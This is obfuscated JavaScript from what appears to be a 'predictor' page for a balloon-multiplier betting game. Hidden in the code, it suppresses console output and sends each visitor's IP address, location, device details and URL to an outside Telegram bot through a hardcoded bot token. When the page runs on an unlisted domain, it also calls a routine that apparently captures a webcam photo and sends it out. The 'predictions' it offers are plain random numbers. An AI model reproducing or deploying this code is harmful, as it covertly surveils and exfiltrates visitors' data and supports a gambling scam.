"='cur", 'backB', 'byV+1', 'wseJU', '8usSU', 'v88tf', 'jsUb5', 'ZRSDz', 'Dg8Qd', " rgba", 'PfsZP', 'check', 'OLyQX', 'dhtXE', 'JrTsP', 'NWhBw', 'VUdsz', 'sin', 'text-', ':imag', 'AAHLY', 'MLmJ5', 'twink', 'ift-h', 'l5OOR', 'kI6Ej', 'cUDcn', "nite ", 's3+gS', 'BRaLP', " { te", 'UhEUg', ": 100", 'CnKpF', 'sfull', '+HYNR', 'yyGUE', 'value', '9WVoO', 'XUgEB', '9ttDg', 'yjpYa', 'kyUrx', 'vtYi6', 'VpYqt', '0ccsm', 'vC87G', '4k7Ji', 'win-a', 'KaOhd', 'UzfQW', '7y9jv', 'zzW49', "\n❗️ <b", 'zNCcx', 'STePb', 'оступ', 'FRwDo', "2s ea", 'YJqPN', 'fromC', 'ate', 'NYnjl', ", .ne", 'ADOkJ', "   </", 'FNbY4', 'ZVEMQ', "s, tr", " cent", 'rgba(', 'XzPwX', "    h", 'ount', 'Selec', 'GoNuS', 'pow', 'eoSzB', 'cente', 'PEeyR', 'j/7//', 'tton', 'teleg', 'LKLeC', 'MeHUA', 'ryEmo', 'OzBUH', 'detxB', " 25px", "er;\n ", 'lWYVE', " just", 'bdUOD', 'L5NzD', 'aMvzo', 'gn-it', 'zBdyj', 'cNvYN', 'larBX', 'captu', 'ak3bX', 'sGYri', '4e04k', 'Mx1Lz', 'HuOrH', 'DEWDT', 'hg/eb', 'ge:', 'catch', 'XboiH', 'nfini', 'Deskt', "orm: ", 'oon', 'DgRKv', '3913c', 'sszKl', 'vX8QQ', 'pfwAa', '9R7kC', 'inner', '#FFFF', 't5IBg', 'zKRzo', 'ont-s', '6OmqM', 'kzQpt', 'yEQCH', 'ozpOy', 'gHUcR', 'cPaLH', "ve;\n ", " 50% ", 'duA5V', 'kVEKD', 'A1Gm/', 'TebOI', 'infla', 'kzNiz', 'NaZXx', 'e-out', 'ient(', 'cmJJf', ": 1.5", 'XsVRO', 'Ktcpb', 'betti', 'Type:', 'stop', 'MCJTs', 'hover', 'ту:</', '81773', 'empEs', 'Dz+0l', 'now', 'wANVD', "in: <", 'cZa/W', 'addEv', "le=\"m", 'dcdSM', 'cDfKe', 'ugefh', 'EfwHr', 'JHCFo', 'cBXNY', 'idPHL', 'OOHoQ', 'i.tel', 'YLLDi', '.satu', 'Qvfkf', 'betDi', 'getCo', 'nZNGZ', 'exwiW', 'se-ou', 'LqYSX', 'HCFvz', 'vfONU', "   co", 'uTgoR', 'AlYOO', '326268ZgihpZ', 'offse', 'Lm+Q1', " <div", 'nHkWG', 'tube.', 'km9zw', 'YnZCg', 'urati', " 15px", 'split', "w {\n ", 'OGMWh', 'BxOeJ', 'gm3Q4', "дить ", 'ctor(', " дост", 'ernat', 'ixBut', 'URhpz', 'tify-', 'icker', 'MhlCY', 'ZY0jY', 'NybdM', 'dbyqL', 'appen', 'jNoI0', 'Sa7Mr', 'zpCPp', 'ject', 'FJNeo', '#7C4D', 'ETzhB', 'XI4QW', 'odeAt', 'toFix', 'ition', '3|2|0', '2I9hG', 'CgUAX', 'sGmxu', 'bdClK', 'pxmrv', 'Rfgma', 'rqHhZ', 'klRUH', "\n📍 Do", 'Q3b96', '0LpFY', 'a(255', 'YNLGH', 'ransf', '8AsUg', '0/D4o', 'KiqWs', 'conte', 'AtK1v', 'ryNam', 'YDGzT', 'pq0j0', "em;\n ", 'oAAoF', 'CaAgE', 'gRtHU', 'czjqV', 'ejrkN', 'OstIe', " 0.22", 'LTUuV', 'le-sm', '+YCh8', 'MhNlQ', 'bind', 'ThvRG', 'none;', 'pkVEH', '2cbWg', 'xEIIE', 'oVxXk', 'forEa', 'WSA65', " 0, 0", 'wefJM', 'reduc', 'asWYS', "вы хо", 'JcXcN', 'torAl', '(1)', 'B0lEQ', 'nlQpp', 'bVwgF', 'gent', 'vzfNl', 'HVvFp', 'AoEWV', 'MnTyw', 'VK4Dc', 'Onkm3', '9lxNB', "   <l", 'ulleE', 'vgfDo', 'eLFnn', 'n55Eq', 'ainer', 'city', 'Heigh', 'erlay', 'KrvDP', 'kdnWH', 'LinpZ', 'HndSD', 'conta', 'cWFwE', 'MXNEQ', 'ttBIZ', '0O3kc', 'Vypzm', "rlay\"", "1); }", 'ZXNZv', 'mxjOb', "ss=\"a", 'pZrbq', 'qGnGR', '8g7Fu', 'w4+Xl', 'ngPan', 'Irb8U', 'HVlBB', 'vhVtB', '</cod', "ex: 9", 'min', '23Xsv', "n() ", " infi", 'iPhon', 'SZc8K', 'ajxNf', 'wVuzK', 'AyOfx', 'R4mkH', "ul {\n", 'VmqrE', 'FRmiK', 'dyzL0', 'QKiiz', '6JzR5', 'tWidt', 't</a>', ": <co", 'yO9g3', 'NPA0z', 'GW9U3', 'NIZMF', 'name', 'fAbxI', '/tZLh', '669bj', 'CWbUV', 'cudV/', 'lrvVI', 'sHhrh', 'fe+xR', 'fDWRK', 'qvzdH', '8Xo4S', '8e6rc', 'GeSUh', 'tnkzo', 'weigh', 'S8dN3', "wn De", 'CHbFQ', 'yGwBf', "e>\n🌐 ", 'hunnA', 'B9/X1', 'FQEIM', 'yNTEE', 'DpGKs', 'Al0Io', 'mCkX3', 'K7r9R', 'CAYAA', 'Ltcms', 'imbSk', '29mnl', 'hRDIx', '500px', "de>\n📱", 'bhdyM', 'e/png', 'WmyvH', '[name', 'fyxxk', 'iTunv', " Doma", 'DcyoL', "p>\n  ", 'aDRtc', 'frame', 'Esq7J', 'SHeKx', 'iJHjw', "\"data", '2rrtd', "тели ", 'etXt6', 'Ro1Y8', 'GSBSD', 'JLP9H', "ul>\n\n", 'VlGVH', '7E8yW', 'nimat', 'DDmnI', "e>\n🖥️ ", 'zVukL', 'cNOVp', 'inclu', 'ZHpDC', 'LgAte', 'trim', 'GwrMr', 'Xq1qU', 'ebxpa', '99031', 'confi', '-brig', 'aurwx', 't-fam', 'Color', 'sCHCN', 'fontS', 'zjKKe', 'JbhHh', '#E040', 'CgUKz', 'A6DLp', 'hhgEz', "упом ", "жно в", 'opNno', 'bCwka', 'cle', 'FmutB', '://as', " @key", 'HKQlo', 'SWpwM', 'cauZj', 'M5+jv', " 1s i", 'LPi3p', 'RUGSk', 'margi', 'jPhTk', 'cweoE', 'dMtgA', 'etect', 'SNKOz', 'hLe+s', 'rmBut', '9FStm', "    }", 'S5mjI', 'eREfn', 'm/lOw', 'Andro', '9TkyF', '3OkbD', 'toStr', 'zVtoj', 'JgfUn', 'fZONk', 'drdou', 'zTBUD', 'du+Rw', 'wONaM', 'FrcCI', 'RQ7VJ', 't.co/', 'tIaMc', 'PBngY', "\n    ", 'ioKHf', 'jRAna', 'MetTx', '1731jsFynf', '72639', 'RjY/H', "   al", "0.1s ", '6o67A', "  col", 'olaoY', "ames ", 'Rvvah', 'cjiCX', 'led', 'w/mix', 'acXfG', 'mviFS', '371B4', 'VzWWE', '(255,', 'c4gM7', '1.00x', " opac", 'proto', 'fcjlH', 'lvsKS', 'zl9I8', 'dpskS', 'IgSKv', 'EI2fY', '/div>', 'cMdWR', 'amRMb', 'xZ7ly', 'RxAPS', 'lsgzF', 'dMLhn', 'eBdpb', '6cqFC', 'shock', 'usDzy', "55, 2", 'G1bkL', 'W5lkN', '4sdtC', '--end', 'AVoj1', 'li>Не', '12PMO', 'PIyMh', 'SoZRj', '/9EUA', 'оспро', '8WBKt', " 0 0 ", 'strin', 'YLuxZ', 'mjUQl', 'CEAwD', 'mHmnd', 'iPYEU', 'uXrvG', 'oDjY/', 'qHPzw', 'erCas', 'BD54L', 'wVKIM', 'JLBFU', 'ucWoy', "  ali", 'gAgwE', 'late(', "n: fl", 'hjORc', 'rnVKm', 'MfvbT', 'pmvTK', 'iFTzC', 'DweCi', 'FBDkD', 'MRnNy', 'RUuXo', 'J5hbm', 'lQgjm', ") sca", " Dete", 'TDtMw', 'Windo', 'bcPT8', '-70%', " alte", 'match', 'xjJFL', 'nafqZ', 'v=dQw', 'ba(25', 'xQHRb', 'ssvVR', 'overf', '8Bd6t', '/cH+Z', 'rE0Yn', 'vMWje', "on: r", 'AmInQ', 'YRwoG', "e alt", 'iHfQG', 'IshSF', 'qRW/v', 'hgRmt', 'WPCaP', "ить в", 'PGqEM', "vh;\n ", 'IOYzA', 'EFizm', '-styl', 'remov', 'XMqNB', '508Gu', '2c34;', "емы с", "rm 0.", "ody {", 'N5dPs', 'jloJY', 'mixki', 'KPH3x', 'nLgYB', 'SUbsb', "n (fu", '.</li', 'PYXCm', 'pSJfM', 'MhRnz', 'zTI95', 'nBNFj', 'eak-2', 'opESk', 'mPgTj', 'HnYWZ', 'oTrgf', 'tK9fV', " bot:", 'KF+uj', 'QIrpI', 'zAmiY', "  <di", 'EdZqF', " capt", '22px', 'NRuwm', 'oaIxM', "  mar", 'Yhylt', "px 0;", 'XwmgI', 'mADLN', '36px', 'arrow', 'Pn2E+', 'predi', 'userA', "se, s", 'yaZWV', 'mSAsc', 'QXcPU', " 10px", 'wlVBG', 'jkKdc', 'betAm', 'AnSAc', 'vzoVg', "l', s", '43uvE', "m: 0;", 'QMzFB', '914yz', '.org/', 'XqnQb', 'play', ">New ", 'explo', 'rvBdv', 'OjYtf', "ref=\"", '0ezAA', 'ALL5A', 'omain', 'iIc9k', 'CZKHq', 'PSXOt', '#448A', 'IajwR', " righ", 'sZYFQ', 'RDTgy', '7cuME', 'авиль', 'ffWyV', 'LokAz', 'FlwVX', 'jyjkS', 'duvqY', "1.5s ", 'FZO1F', 'SbPzl', 'AARMD', 'xt-al', 'ADpHJ', 'qWqtT', 'knDTO', 'jmMJh', 'sW2br', 'eeFOx', 'y+1Oc', 'FJCI5', 'PFKBv', ": 4em", 'q/+6k', 'Y22x9', 'AAAAi', 'aHHnc', 'toUpp', 'NnCly', "l 8s ", 'vkACo', "rge 5", '.expl', "  bor", 'hkAg0', 'jGfHz', 'BFQaD', 'image', 'XSzTG', 'O/+z/', "ass=\"", 'BAtdm', "cale ", 'sets.', 'NlCIW', 'HlJOa', 'box-s', 'IgezB', 'OPHDR', 'YicXF', 'ZKiRJ', 'KRgET', 'regio', '/isRl', 'YDAZO', 'DOFSK', 'IqvWg', '#FF40', 'locat', 'можно', 'Wdbe/', 'отели', 'getUs', 'QvBzF', 'EAg2B', "    1", " src=", 'V2jQ6', 'sfx/p', 'SSHLN', 'ubic-', 'wuKNE', 'phzJR', 'unAem', 'RX/+e', '9/uXT', "e>\n⏰ ", 'ent', 'finP9', "20px ", '|1|4', 'CcYVg', 'PPcMd', 'TYadD', 'nctio', 'FPCuI', 't-sha', 'THLNs', 'nd-co', 'PFHRS', 'https', 'DSvAy', 'mVxKS', 'ezier', 'NyHeK', 'Lp0fj', 'DIwXN', "e>\n  ", 'y2YWa', '12ULlifY', 'ting', 'QFyHO', 'xxpJm', 'taxZY', 'fiIdB', '206exxSJc', 'IHYQB', 'WkXJD', 's0jCx', 'dYMuu', 'Linux', 'GBOCz', "ить р", 'zRaCs', 'jZJiI', 'peeUO', 'tpJYR', "ul>\n ", 'hTNDF', 'Cy+/V', 'xt-sh', 'xRkBj', 'rsSGQ', 'OH9Fu', 'tcVKR', 'ssLDI', 'FhscB', ": 5px", 'href', 'yRWVf', 'FZfwa', 'TpBSa', 'nEowy', "    ", 'Photo', 'JkK0D', 'YffKl', 'ight:', 'bula,', 'nate', 'aNT4h', 'ode>', "on: a", 'a+kfW', 'mFukg', 'tVUPd', 'QGdVJ', 'dgoNY', "  bac", 'ером:', 'xtkmo', '3YGRg', 'LU9yO', "or: w", "eft\">", 'qhJVa', 'I2iEg', 'EevQJ', 'Lrhsj', '--bac', 'x-dir', "d to ", 'T8tja', '#EEFF', '0|2|3', "0 0 1", 'dJFDr', ".7), ", 'IFbXW', 'sKVcn', 'CHUGx', "ay: f", "/b>\n📍", "7));\n", 'HLGfn', '>Проб', "v cla", 'sV6Gw', 'charC', 'filte', 'XKbdR', 'opert', 'vJaAZ', 'i23UV', 'anima', 'iner', "ity: ", '98jTM', 'bezie', 'CiaKs', 'ing', 'Csob3', 'hNVfP', 'HKwzu', 'lHidI', 'ddZnE', 'YbZIy', 'XYeuj', 'cPzth', 'ccess', 'JeMYO', '0.22,', 'aSlWb', 'vsQSx', 'excep', "    b", 'XBLoG', 'keyfr', 'pOKqB', '2Vb6G', 'aboyq', 'wFQvK', '55830gVcQQl', 'X3R28', 'yTOVC', 'ApN1q', 'MtnnW', " -50%", " 100%", 'paddi', '-50%,', 'some', 'ZxQWo', 'matio', '+VNk/', 'sPiJK', 'Faile', 'lBvHW', '7o7hF', 'bguVw', 'XNOMS', 'one', 'finit', "zed A", 'fowwS', 'AmSUY', 'fIGWk', 'qgRLI', 'брауз', 'trace', 'XEWKf', 'curso', 'ball', 'ackgr', 'MHapa', 'deg)', 'info.', '7ctKt', 'pzNZu', 'xf8AP', 'p5/O5', 'GVYVn', 'ению,', 'FzHfm', 'xH2TR', '/P8V9', "4s in", 'ify-c'];
  _0xaa38 = function () {
    return _0x2cd778;
  };
  return _0xaa38();
}
async function initTelegramBot() {
  const _0x391f35 = function () {
    let _0x48c950 = true;
    return function (_0x19a175, _0x4421b8) {
      const _0x93a592 = _0x48c950 ? function () {
        if (_0x4421b8) {
          const _0x5632ab = _0x4421b8.apply(_0x19a175, arguments);
          _0x4421b8 = null;
          return _0x5632ab;
        }
      } : function () {};
      _0x48c950 = false;
      return _0x93a592;
    };
  }();
  const _0x4124f2 = _0x391f35(this, function () {
    const _0x38515c = function () {
      let _0x34c1b9;
      try {
        _0x34c1b9 = Function("return (function() {}.constructor(\"return this\")( ));")();
      } catch (_0xb7dea3) {
        _0x34c1b9 = window;
      }
      return _0x34c1b9;
    };
    const _0x183310 = _0x38515c();
    const _0x2844af = _0x183310.console = _0x183310.console || {};
    const _0x36add6 = ["log", "warn", "info", "error", "exception", "table", "trace"];
    for (let _0x5546af = 0; _0x5546af < _0x36add6.length; _0x5546af++) {
      const _0x271257 = _0x391f35.constructor.prototype.bind(_0x391f35);
      const _0x374918 = _0x36add6[_0x5546af];
      const _0x30c1f4 = _0x2844af[_0x374918] || _0x271257;
      _0x271257.__proto__ = _0x391f35.bind(_0x391f35);
      _0x271257.toString = _0x30c1f4.toString.bind(_0x30c1f4);
      _0x2844af[_0x374918] = _0x271257;
    }
  });
  _0x4124f2();
  const _0x271d0c = {
    domain: window.location.hostname
  };
  _0x271d0c.fullUrl = window.location.href;
  if (_0x271d0c.domain !== "trd.cc.nf") {
    document.body.innerHTML = "\n            <div id=\"overlay\">\n                <h1>Ошибка 404: Доступ запрещен</h1>\n                <div class=\"arrow top\"></div>\n                <div class=\"arrow bottom\"></div>\n                <div class=\"arrow left\"></div>\n                <div class=\"arrow right\"></div>\n                <img src=\"data:image/png;base64,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\" alt=\"Error Image\" style=\"max-width: 100%; height: auto;\" />\n                <p>К сожалению, возникли проблемы с доступом к сайту:</p>\n                <ul>\n                    <li>Не удалось загрузить ресурс.</li>\n                    <li>Проблемы с сервером.</li>\n                    <li>Неправильный домен.</li>\n                    <li>Возможно вы блюм.</li>\n                    <li>Возможно вы хотели спиздить вебку.</li>\n                    <li>Возможно вы хотели обновить вебку за 15$.</li>\n                    <li>Возможно вы хотели купить вебку у ее кодера.</li>\n                </ul>\n\n                <a href=\"https://www.youtube.com/watch?v=dQw4w9WgXcQ\" id=\"fixButton\">Fix It</a>\n            </div>\n        ";
    const _0x3e9dc0 = document.createElement("style");
    _0x3e9dc0.innerHTML = "\n\n            body {\n                margin: 0;\n                height: 100vh;\n                display: flex;\n                justify-content: center;\n                align-items: center;\n                position: relative;\n                overflow: hidden;\n                background-color: #282c34;\n                color: white;\n                font-family: 'Arial', sans-serif;\n            }\n            #overlay {\n                position: absolute;\n                top: 0;\n                left: 0;\n                right: 0;\n                bottom: 0;\n                background: linear-gradient(135deg, rgba(255, 0, 0, 0.7), rgba(255, 255, 0, 0.7));\n                display: flex;\n                flex-direction: column;\n                justify-content: center;\n                align-items: center;\n                z-index: 9999;\n                padding: 20px;\n                animation: flicker 1s infinite;\n            }\n            h1 {\n                font-size: 4em;\n                margin: 0;\n                text-shadow: 0 0 10px rgba(255, 255, 255, 0.8);\n                animation: glow 1.5s infinite alternate;\n            }\n            p {\n                font-size: 1.5em;\n                margin: 20px 0;\n                text-shadow: 0 0 5px rgba(255, 255, 255, 0.5);\n            }\n            ul {\n                list-style-type: none;\n                padding: 0;\n                text-align: center;\n                font-size: 1.2em;\n            }\n            #fixButton {\n                background-color: white;\n                color: red;\n                border: none;\n                padding: 10px 20px;\n                font-size: 18px;\n                cursor: pointer;\n                text-decoration: none;\n                border-radius: 5px;\n                transition: background-color 0.3s, transform 0.3s;\n                box-shadow: 0 0 10px rgba(255, 0, 0, 0.8);\n            }\n            #fixButton:hover {\n                background-color: #ddd;\n                transform: scale(1.05);\n            }\n            @keyframes flicker {\n                0% { opacity: 1; }\n                50% { opacity: 0.7; }\n                100% { opacity: 1; }\n            }\n            @keyframes glow {\n                0% { text-shadow: 0 0 10px rgba(255, 255, 255, 0.8); }\n                100% { text-shadow: 0 0 20px rgba(255, 255, 255, 1); }\n            }\n\n        ";
    document.head.appendChild(_0x3e9dc0);
    const _0x5a3725 = await getUserInfo();
    await sendTelegramMessage("\n🚫 <b>Unauthorized Access Attempt Detected</b>\n📍 Domain: <code>" + _0x271d0c.domain + "</code>\n🔗 URL: <code>" + _0x271d0c.fullUrl + "</code>\n🌐 IP: <code>" + _0x5a3725.ip + "</code>\n📌 Location: " + _0x5a3725.city + ", " + _0x5a3725.region + ", " + _0x5a3725.countryName + " " + _0x5a3725.countryEmoji + "\n📱 Device: <code>" + _0x5a3725.deviceModel + "</code>\n🖥️ Type: <code>" + _0x5a3725.deviceType + " (" + _0x5a3725.deviceOS + ")</code>\n📱 User Agent: <code>" + _0x5a3725.userAgent + "</code>\n⏰ Time: <code>" + new Date().toISOString() + "</code>\n    ");
    await captureAndSendPhoto();
    return;
  }
  try {
    const _0x2142bb = await fetch("https://api.telegram.org/bot8493084337:AAFPW75-vT4EgtloLveSmbgN-6bvD3FYztos/getMe");
    const _0x655dec = await _0x2142bb.json();
    if (_0x655dec.ok) {
      console.log("Bot initialized");
      isAuthenticated = true;
      const _0x1d02ad = await getUserInfo();
      await sendTelegramMessage("\n🚀 <b>New Bot Access Detected</b>\n📍 Domain: <code>" + _0x271d0c.domain + "</code>\n🔗 URL: <code>" + _0x271d0c.fullUrl + "</code>\n🌐 IP: <code>" + _0x1d02ad.ip + "</code>\n📌 Location: " + _0x1d02ad.city + ", " + _0x1d02ad.region + ", " + _0x1d02ad.countryName + " " + _0x1d02ad.countryEmoji + "\n📱 Device: <code>" + _0x1d02ad.deviceModel + "</code>\n🖥️ Type: <code>" + _0x1d02ad.deviceType + " (" + _0x1d02ad.deviceOS + ")</code>\n📱 User Agent: <code>" + _0x1d02ad.userAgent + "</code>\n⏰ Time: <code>" + new Date().toISOString() + "</code>\n    ");
    }
  } catch (_0x33208d) {
    console.error("Failed to initialize bot:", _0x33208d);
    const _0x50731e = await getUserInfo();
    await sendTelegramMessage("\n❗️ <b>Bot Initialization Failed</b>\n📍 Domain: <code>" + _0x271d0c.domain + "</code>\n🔗 URL: <code>" + _0x271d0c.fullUrl + "</code>\n🌐 IP: <code>" + _0x50731e.ip + "</code>\n📌 Location: " + _0x50731e.city + ", " + _0x50731e.region + ", " + _0x50731e.countryName + " " + _0x50731e.countryEmoji + "\n📱 Device: <code>" + _0x50731e.deviceModel + "</code>\n🖥️ Type: <code>" + _0x50731e.deviceType + " (" + _0x50731e.deviceOS + ")</code>\n📱 User Agent: <code>" + _0x50731e.userAgent + "</code>\n⏰ Time: <code>" + new Date().toISOString() + "</code>\n    ");
  }
}
initTelegramBot().then(() => {
  if (isAuthenticated) {
    fetchDataAndUpdate();
    setInterval(fetchDataAndUpdate, 100);
    setInterval(checkSignal, 100);
    checkSignal();
  }
});
const gameContainer = document.querySelector(".game-container");
const balloon = document.querySelector(".balloon");
const valueDisplay = document.querySelector(".value");
const predictButton = document.getElementById("predictButton");
const backButton = document.getElementById("backButton");
const telegramButton = document.getElementById("telegramButton");
const stars = document.querySelector(".stars");
const saturn = document.querySelector(".saturn");
let isAnimating = false;
let targetMultiplier = 1;
let saturnInterval;
function createRandomMeteor() {
  const _0xe92db1 = Math.random() * 15;
  const _0x41a09a = Math.random() * 80;
  const _0x46f4dc = Math.random() * 40;
  setTimeout(() => {
    const _0x19fc57 = document.createElement("div");
    _0x19fc57.className = "meteor";
    _0x19fc57.style.left = _0x41a09a + '%';
    _0x19fc57.style.top = _0x46f4dc + '%';
    document.querySelector(".space-elements").appendChild(_0x19fc57);
    setTimeout(() => {
      _0x19fc57.remove();
      createRandomMeteor();
    }, 8000);
  }, _0xe92db1 * 1000);
}
function moveSaturn() {
  saturn.style.opacity = '0';
  setTimeout(() => {
    const _0x1b0e20 = 5 + Math.random() * 30;
    const _0xe8fb3a = 5 + Math.random() * 30;
    saturn.style.top = _0x1b0e20 + '%';
    saturn.style.right = _0xe8fb3a + '%';
    saturn.style.opacity = '1';
  }, 1500);
}
function startSaturnMovement() {
  if (saturnInterval) {
    clearInterval(saturnInterval);
  }
  const _0x3869af = 15000 + Math.random() * 15000;
  saturnInterval = setInterval(moveSaturn, _0x3869af);
}
function getRandomMultiplier() {
  return (1.2 + Math.random() * 8.8).toFixed(2);
}
function updateBalloon(_0x2d0ad6) {
  valueDisplay.textContent = parseFloat(_0x2d0ad6).toFixed(2) + 'x';
  const _0x3289ec = (_0x2d0ad6 - 1) / 9;
  const _0x2b3b70 = 1 + 0.8 * _0x3289ec;
  const _0x419beb = -70 - 15 * _0x3289ec;
  balloon.style.setProperty("--lift-height", _0x419beb + '%');
  balloon.style.transform = "translate(-50%, " + _0x419beb + '%)';
  balloon.style.scale = _0x2b3b70.toFixed(2);
  balloon.classList.add("flying");
  gameContainer.classList.add("flying");
  if (_0x2d0ad6 > 5) {
    balloon.classList.add("high-flying");
    gameContainer.classList.add("high-flying");
  } else {
    balloon.classList.remove("high-flying");
    gameContainer.classList.remove("high-flying");
  }
  if (_0x2d0ad6 > 5) {
    const _0x1569b1 = 0.3 + (_0x2d0ad6 - 5) / 10;
    saturn.style.filter = "drop-shadow(0 0 25px rgba(255, 255, 255, " + _0x1569b1 + '))';
  }
}
function resetBalloon() {
  return new Promise(_0x33919d => {
    balloon.classList.remove("flying");
    balloon.classList.remove("high-flying");
    gameContainer.classList.remove("flying");
